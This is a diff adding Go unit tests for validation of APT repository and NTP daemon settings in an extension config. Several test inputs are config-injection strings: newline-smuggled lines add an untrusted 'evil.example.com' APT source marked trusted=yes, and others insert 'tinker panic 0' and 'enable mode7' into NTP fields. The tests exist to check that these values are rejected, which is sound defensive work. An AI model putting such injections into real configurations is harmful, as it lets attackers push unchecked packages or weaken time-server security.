@@ -452,4 +452,72 @@ var _ = Describe("ExtensionConfig validation", func() {
 		Expect(errs[0].Type).To(Equal(field.ErrorTypeInvalid))
 		Expect(errs[0].Field).To(Equal("aptRepositories[0].name"))
 	})
+
+	It("should fail when keyUrl does not use https", func() {
+		config.AptRepositories = []configv1alpha1.AptRepository{
+			{Name: "docker", URI: "https://download.docker.com/linux/ubuntu", KeyURL: "http://download.docker.com/linux/ubuntu/gpg"},
+		}
+		errs := ValidateExtensionConfig(config)
+		Expect(errs).To(HaveLen(1))
+		Expect(errs[0].Type).To(Equal(field.ErrorTypeInvalid))
+		Expect(errs[0].Field).To(Equal("aptRepositories[0].keyUrl"))
+	})
+
+	It("should succeed with valid suite and components", func() {
+		config.AptRepositories = []configv1alpha1.AptRepository{
+			{Name: "docker", URI: "https://download.docker.com/linux/ubuntu", Suite: "jammy", Components: []string{"stable", "main"}},
+		}
+		Expect(ValidateExtensionConfig(config)).To(BeEmpty())
+	})
+
+	It("should fail with newline injection in suite", func() {
+		config.AptRepositories = []configv1alpha1.AptRepository{
+			{Name: "docker", URI: "https://download.docker.com/linux/ubuntu", Suite: "jammy\ndeb [trusted=yes] http://evil.example.com stable main"},
+		}
+		errs := ValidateExtensionConfig(config)
+		Expect(errs).To(HaveLen(1))
+		Expect(errs[0].Type).To(Equal(field.ErrorTypeInvalid))
+		Expect(errs[0].Field).To(Equal("aptRepositories[0].suite"))
+	})
+
+	It("should fail with newline injection in a component", func() {
+		config.AptRepositories = []configv1alpha1.AptRepository{
+			{Name: "docker", URI: "https://download.docker.com/linux/ubuntu", Components: []string{"stable", "main\ndeb [trusted=yes] http://evil.example.com stable main"}},
+		}
+		errs := ValidateExtensionConfig(config)
+		Expect(errs).To(HaveLen(1))
+		Expect(errs[0].Type).To(Equal(field.ErrorTypeInvalid))
+		Expect(errs[0].Field).To(Equal("aptRepositories[0].components[1]"))
+	})
+
+	It("should require ntpd config if ntpd is selected as daemon", func() {
+		config.NTP.Daemon = configv1alpha1.NTPD
+		errs := ValidateExtensionConfig(config)
+		Expect(errs).To(HaveLen(1))
+		Expect(errs[0].Type).To(Equal(field.ErrorTypeRequired))
+		Expect(errs[0].Field).To(Equal("ntpd"))
+	})
+
+	It("should fail with invalid characters in an ntpd interface", func() {
+		config.NTP.Daemon = configv1alpha1.NTPD
+		config.NTP.NTPD = &configv1alpha1.NTPDConfig{
+			Servers:    []string{"ntp.ubuntu.com"},
+			Interfaces: []string{"enp1s0\ntinker panic 0"},
+		}
+		errs := ValidateExtensionConfig(config)
+		Expect(errs).To(HaveLen(1))
+		Expect(errs[0].Type).To(Equal(field.ErrorTypeInvalid))
+		Expect(errs[0].Field).To(Equal("ntpd.interfaces[0]"))
+	})
+
+	It("should fail with invalid characters in an ntpd server", func() {
+		config.NTP.Daemon = configv1alpha1.NTPD
+		config.NTP.NTPD = &configv1alpha1.NTPDConfig{
+			Servers: []string{"ntp.ubuntu.com\nenable mode7"},
+		}
+		errs := ValidateExtensionConfig(config)
+		Expect(errs).To(HaveLen(1))
+		Expect(errs[0].Type).To(Equal(field.ErrorTypeInvalid))
+		Expect(errs[0].Field).To(Equal("ntpd.servers[0]"))
+	})
 })
